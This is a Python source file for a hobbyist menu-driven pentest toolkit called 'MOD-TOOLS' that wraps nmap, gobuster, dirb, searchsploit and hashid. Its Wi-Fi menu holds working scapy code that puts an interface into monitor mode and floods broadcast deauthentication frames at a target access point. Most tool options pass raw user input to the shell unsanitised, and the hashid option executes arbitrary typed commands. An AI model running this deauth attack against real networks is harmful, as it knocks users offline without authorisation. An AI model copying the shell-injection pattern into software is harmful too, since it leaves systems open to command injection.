import pyfiglet
from termcolor import colored
import sys
import time
import random
import string
import os
import subprocess
import re
from scapy.all import *
import signal

# Define the face-like ASCII art (approximation of the Evilginx2 face)
face_art = [
    "   _______   ",
    "  /       \\  ",
    " /  ### ### \\ ",
    "|   ### ###  |",
    "|    ===    |",
    " \\_________/ "
]

# Generate the MOD-TOOLS text using pyfiglet
welcome_text = pyfiglet.figlet_format("MOD-TOOLS")

# Split the welcome text into lines for combining with the face
welcome_lines = welcome_text.split('\n')

# Determine the maximum height (number of lines) for the combined display
max_height = max(len(face_art), len(welcome_lines))

# Pad the shorter art with empty lines to match the height
face_art += [" " * len(face_art[0])] * (max_height - len(face_art))
welcome_lines += [" " * len(welcome_lines[0])] * (max_height - len(welcome_lines))

# Combine the face and the welcome text side by side
combined_art = []
for i in range(max_height):
    combined_art.append(face_art[i] + "  " + welcome_lines[i])

# Add the additional lines (Community Edition, author, version, etc.)
combined_art.append(" " * len(face_art[0]) + "  " + "--- Community Edition ---")
combined_art.append(" " * len(face_art[0]) + "  " + "by Your Name (@asta)")
combined_art.append(" " * len(face_art[0]) + "  " + "version 1.0.0")

# Join all lines into a single string
final_text = '\n'.join(combined_art)

# Print the combined art directly in green without delay
print(colored(final_text, 'green'))
# Function to clear the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to check if the user is root
def check_root():
    result = subprocess.run(['whoami'], capture_output=True, text=True).stdout.strip()
    if result != 'root':
        print(colored("Error: Root access is required for this action. Please run as root.", 'red'))
        sys.exit(1)

# Function to list available wordlists from specified directories
def list_wordlists():
    wordlists = []
    full_paths = []
    directories = ['/usr/share/wordlists/dirb', '/usr/share/wordlists/dirbuster']
    for directory in directories:
        for file in os.listdir(directory):
            if file.endswith('.txt'):
                wordlists.append(file)  # Store only the filename
                full_paths.append(os.path.join(directory, file))  # Store full path for execution
    return wordlists, full_paths
# Command lists
main_command_list = ["1. web", "2. forensics", "3. wifi"]
web_tools_list = ["1. nmap scan", "2. Gobuster", "3. Dirb", "4. FFUF", "5. Dotdotpwn", "6. Searchsploit"]
wifi_tools_list = ["1. Deauth"]  # WiFi tools list with Deauth option
forensics_tools_list = ["1. Hashes"]

# State to track which tool category has been selected
current_menu = "main"
selected_tool = None

# Loop to keep asking for commands
while True:
    command = input(colored("Enter command: ", 'green')).strip().lower()

    if command == 'exit':
        print(colored("Terminating session... Goodbye!", 'red'))
        break
    elif command == 'clear':
        clear_screen()  # Clear the screen when 'clear' is typed
        continue  # Skip the rest of the loop
    elif command == 'help':
        help_text = """
        help  -  to see available commands.
        list/ls - to list the available commands.
        clear - to clear the screen
        back - to go to the previous option. i.e go back.
        banner - to display the banner.
        exit - to exit the program.
        """
        print(help_text)
        continue

    # Main command list handler
    if current_menu == "main":

        if command == 'list' or command == 'ls' :
            print(colored("\n".join(main_command_list), 'cyan'))  # Display the main list
        elif command == '1' or command == 'web':
            print(colored("You have selected: Web", 'green'))
            selected_tool = "web"
            print(colored("\n".join(web_tools_list), 'cyan'))  # Display the web tools list
            current_menu = "web_tools"  # Switch to the web tools menu
        elif command == '2' or command == 'forensics':  # Forensics option
            print(colored("You have selected: Forensics", 'green'))
            selected_tool = "forensics"
            print(colored("\n".join(forensics_tools_list), 'cyan'))  # Display the forensics tools list
            current_menu = "forensics_tools"  # Switch to the forensics tools menu
        elif command == '3' or command == 'wifi':
            print(colored("You have selected: Wifi", 'green'))
            selected_tool = "wifi"
            print(colored("\n".join(wifi_tools_list), 'cyan'))  # Display the wifi tools list (currently only Deauth)
            current_menu = "wifi_tools"  # Switch to the wifi tools menu
        else:
            print(colored(f"Unknown command: {command}", 'yellow'))

    # Web tools command handler
    elif current_menu == "web_tools":
        if command == 'list' or command == 'ls' :
            print(colored("\n".join(web_tools_list), 'cyan'))  # Display the web tools list again
        elif command == 'back':
            print(colored("Returning to main menu...", 'green'))
            current_menu = "main"  # Go back to the main menu
            selected_tool = None  # Reset selected tool
        elif command == '1' or command == 'nmap':
            print(colored("You have selected: Nmap", 'green'))
            nmap_choice = input(colored("Choose scan type (1. All Port Scan, 2. Normal Scan, 3. OS Scan, 4. Custom Scan, back to go back): ", 'green')).strip()
            ip_address = input(colored("Enter IP address: ", 'green'))

            # Determine the scan command based on user choice
            if nmap_choice == '1':
                nmap_command = f"nmap -sV -Pn -sC -p- {ip_address}"  # All ports
            elif nmap_choice == '2':
                nmap_command = f"nmap {ip_address}"  # Normal scan
            elif nmap_choice == '3':
                nmap_command = f"nmap -sV -Pn -sC -O {ip_address}"  # OS detection
            elif nmap_choice == '4':
                custom_options = input(colored("Enter custom Nmap options (e.g., -v, -p 22,80): ", 'green'))
                custom_ports = input(colored("Enter custom ports (or press Enter to skip): ", 'green')) or ''
                nmap_command = f"nmap {custom_options} {custom_ports} {ip_address}".strip()  # Custom ports and options
            elif nmap_choice == 'back':
                current_menu = "web_tools"  # Go back to web tools menu
                continue
            else:
                print(colored("Invalid choice. Returning to Web Tools menu.", 'yellow'))
                continue

            # Execute the nmap scan and display results
            print(colored("Running Nmap scan...", 'green'))
            try:
                result = subprocess.run(nmap_command, shell=True, capture_output=True, text=True)
                print(colored("Scan results:", 'cyan'))
                print(result.stdout)  # Display the scan results
            except Exception as e:
                print(colored(f"An error occurred: {str(e)}", 'red'))
        elif command == '2' or command == 'gobuster':
            print(colored("You have selected: Gobuster", 'green'))
            url = input(colored("Enter URL to scan (e.g., http://example.com): ", 'green'))
            wordlists, full_paths = list_wordlists()

            # Display available wordlists in rows of 5 with numbering
            print(colored("Available wordlists:", 'cyan'))
            for idx, wordlist in enumerate(wordlists):
                print(f"{idx + 1}. {wordlist}", end="\t")  # Print filenames with numbers
                if (idx + 1) % 5 == 0:
                    print()  # New line after every 5 items
            print()  # Final newline

            wordlist_choice = input(colored("Choose a wordlist number or enter 'custom' for a custom path: ", 'green')).strip()

            if wordlist_choice.lower() == 'custom':
                custom_wordlist = input(colored("Enter the full path to your custom wordlist: ", 'green'))
                selected_wordlist = custom_wordlist
            else:
                try:
                    wordlist_index = int(wordlist_choice) - 1
                    if 0 <= wordlist_index < len(full_paths):
                        selected_wordlist = full_paths[wordlist_index]  # Use full path for execution
                    else:
                        print(colored("Invalid choice. Returning to Web Tools menu.", 'yellow'))
                        continue
                except ValueError:
                    print(colored("Invalid input. Returning to Web Tools menu.", 'yellow'))
                    continue

            # Construct the Gobuster command
            gobuster_command = f"gobuster dir -u {url} -w {selected_wordlist}"
            print(colored("Running Gobuster scan...", 'green'))
            try:
                result = subprocess.run(gobuster_command, shell=True, capture_output=True, text=True)
                print(colored("Scan results:", 'cyan'))
                print(result.stdout)  # Display the scan results
            except Exception as e:
                print(colored(f"An error occurred: {str(e)}", 'red'))
        elif command == '3' or command == 'dirb':
            print(colored("You have selected: Dirb", 'green'))
            url = input(colored("Enter URL to scan (e.g., http://example.com): ", 'green'))

            # Construct the Dirb command
            dirb_command = f"dirb {url} -f"
            print(colored(f"Running Dirb scan on {url}...", 'green'))
            try:
                result = subprocess.run(dirb_command, shell=True, capture_output=True, text=True)
                print(colored("Scan results:", 'cyan'))
                print(result.stdout)  # Display the scan results
            except Exception as e:
                print(colored(f"An error occurred: {str(e)}", 'red'))

        elif command == '6' or command == 'searchsploit':
            print(colored("You have selected: SearchSploit", 'green'))
            query = input(colored("Enter search query (e.g., Apache 2.4): ", 'green'))

            # Construct the SearchSploit command
            searchsploit_command = f"searchsploit {query}"
            print(colored(f"Searching exploits for '{query}'...", 'green'))
            try:
                result = subprocess.run(searchsploit_command, shell=True, capture_output=True, text=True)
                print(colored("Search results:", 'cyan'))
                print(result.stdout)  # Display the search results
            except Exception as e:
                print(colored(f"An error occurred: {str(e)}", 'red'))

        elif command == 'back':
            print(colored("Returning to main menu...", 'green'))
            current_menu = "main"  # Go back to the main menu
            selected_tool = None  # Reset selected tool
        else:
            print(colored(f"Unknown command: {command}", 'yellow'))


    # Forensics tools command handler
    # Forensics tools command handler
    elif current_menu == "forensics_tools":
        if command == 'list' or command == 'ls' :
            print(colored("\n".join(forensics_tools_list), 'cyan'))  # Display the forensics tools list again
        elif command == '1' or command == 'hashes':  # Handle option '1. Hashes'
            print(colored("You have selected: Hashes", 'green'))

            # Display 'hashid -h' only once before entering the repeat loop
            print(colored("Displaying hashid help information...", 'cyan'))
            try:
                result = subprocess.run(['hashid', '-h'], capture_output=True, text=True)
                print(colored(result.stdout, 'cyan'))
            except Exception as e:
                print(colored(f"An error occurred while running 'hashid -h': {str(e)}", 'red'))
                continue

            # Loop to allow multiple hash inputs and ask for "continue"
            while True:
                # Ask the user for input after showing the hashid help the first time
                user_input = input(colored("Enter hashid command or hash to identify: ", 'green')).strip()

                # Check if 'hashid' is in the user input, and execute accordingly
                if 'hashid' in user_input:
                    # If the input contains 'hashid', execute it directly
                    hashid_command = user_input
                else:
                    # If the input does not contain 'hashid', prepend 'hashid' to the input
                    hashid_command = f"hashid {user_input}"

                print(colored(f"Executing: {hashid_command}", 'cyan'))
                try:
                    result = subprocess.run(hashid_command, shell=True, capture_output=True, text=True)
                    print(colored(result.stdout, 'cyan'))
                except Exception as e:
                    print(colored(f"An error occurred while running the command: {str(e)}", 'red'))

                # Ask the user if they want to continue
                continue_choice = input(colored("Continue? (y/n): ", 'green')).strip().lower()
                if continue_choice != 'y':
                    print(colored("Returning to main menu...", 'green'))
                    current_menu = "main"  # Go back to the main menu
                    selected_tool = None  # Reset selected tool
                    break  # Exit the loop and return to the main menu
        elif command == 'back':
            print(colored("Returning to main menu...", 'green'))
            current_menu = "main"  # Go back to the main menu
            selected_tool = None  # Reset selected tool
        else:
            print(colored(f"Unknown command: {command}", 'yellow'))

    # WiFi tools command handler
    elif current_menu == "wifi_tools":
        if command == 'list':
            print(colored("\n".join(wifi_tools_list), 'cyan'))  # Display the WiFi tools list again
        elif command == 'back':
            print(colored("Returning to main menu...", 'green'))
            current_menu = "main"  # Go back to the main menu
            selected_tool = None  # Reset selected tool
        elif command in ['1', 'deauth']:
            check_root()  # Ensure the user has root access
            interface = input(colored("Enter wireless interface (e.g., wlan0): ", 'green')).strip()

            # Ask the user to provide either SSID or BSSID
            user_input = input(colored("Enter SSID or BSSID (whichever you know): ", 'green')).strip()

            bssid = None
            channel = None

            # If the user entered a BSSID, find the channel using airodump-ng
            if ':' in user_input:  # Assuming ':' is used in BSSID format
                bssid = user_input

                try:
                    print(colored(f"Looking for channel of BSSID {bssid}...", 'green'))
                    # Run nmcli command to list available Wi-Fi networks with SSID, BSSID, and CHANNEL
                    result = subprocess.run(
                        ["nmcli", "-f", "SSID,BSSID,CHAN", "device", "wifi", "list"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )

                    if result.returncode != 0:
                        print(f"Error: {result.stderr}")

                    # Iterate through the output and search for the matching BSSID
                    for line in result.stdout.splitlines():
                        line = line.strip()
                        # Split the line into columns by whitespace (since nmcli might have variable spacing)
                        columns = re.split(r'\s{2,}', line)  # This handles any variable whitespace

                        if len(columns) >= 3:  # Ensure the line has enough columns (SSID, BSSID, Channel)
                            current_bssid = columns[1].strip()


                            # Compare the current BSSID with the one provided (case-insensitive)
                            if current_bssid.lower() == bssid.lower():
                                channel = columns[2].strip()

                except Exception as e:
                    print(f"An error occurred: {e}")
            else:
                try:
                    # Run nmcli command to list available Wi-Fi networks with SSID, BSSID, and CHANNEL
                    result = subprocess.run(
                        ["nmcli", "-f", "SSID,BSSID,CHAN", "device", "wifi", "list"],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )

                    if result.returncode != 0:
                        print(f"Error: {result.stderr}")

                    # Iterate through the output and search for the matching SSID
                    for line in result.stdout.splitlines():
                        line = line.strip()
                        # Use regex to ensure proper parsing, even if SSID has spaces
                        match = re.search(rf"{re.escape(user_input)}\s+([A-Fa-f0-9:]+)\s+(\d+)", line)
                        if match:
                            bssid = match.group(1)
                            channel = match.group(2)
                    print(colored(f"Found BSSID: {bssid}, Channel: {channel} for SSID: {user_input}", 'green'))

                except Exception as e:
                    print(f"An error occurred: {e}")



                if channel:
                    print(colored(f"Found channel: {channel} for BSSID: {bssid}", 'green'))
                else:
                    print(colored("Failed to find the channel for the given BSSID.", 'red'))
                    continue  # Return to command selection


            # Execute the Deauth attack using aireplay-ng with the found BSSID and channel
            try:
                time.sleep(4)
                print(colored(f"Putting {interface} into monitor mode...", 'green'))
                try:
                    subprocess.run(f"sudo airmon-ng start {interface}", shell=True, check=True)
                    print(colored(f"{interface} is now in monitor mode.", 'green'))
                except subprocess.CalledProcessError as e:
                    print(colored(f"Failed to set {interface} into monitor mode: {str(e)}", 'red'))
                    continue  # Return to command selection
                print(colored(f"Starting deauth attack on BSSID {bssid} on channel {channel} using {interface}mon...", 'red'))
                deauth_pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / Dot11Deauth()
                print(f"Sending deauth packets to all clients on BSSID: {bssid}")

                # Continuously send the deauth packets
                sendp(deauth_pkt, iface=f"{interface}mon", count=1000, inter=0.1, verbose=1)
                subprocess.run(f"sudo airmon-ng stop {interface}mon")
                while True:
                    time.sleep(1)  # Keep the script running to maintain the deauth attack
            except KeyboardInterrupt:
                # Handle Ctrl+C (keyboard interrupt)
                subprocess.run(f"sudo airmon-ng stop {interface}mon")
                print("\nCtrl+C detected. Exiting gracefully...")
                sys.exit(0)  # Exit the program gracefully
            except Exception as e:
                print(colored(f"An error occurred: {str(e)}", 'red'))


            # Stop monitor mode after the deauth attack
            print(f"Stopping monitor mode on {interface}mon...")
            subprocess.run(f"sudo airmon-ng stop {interface}mon", shell=True)

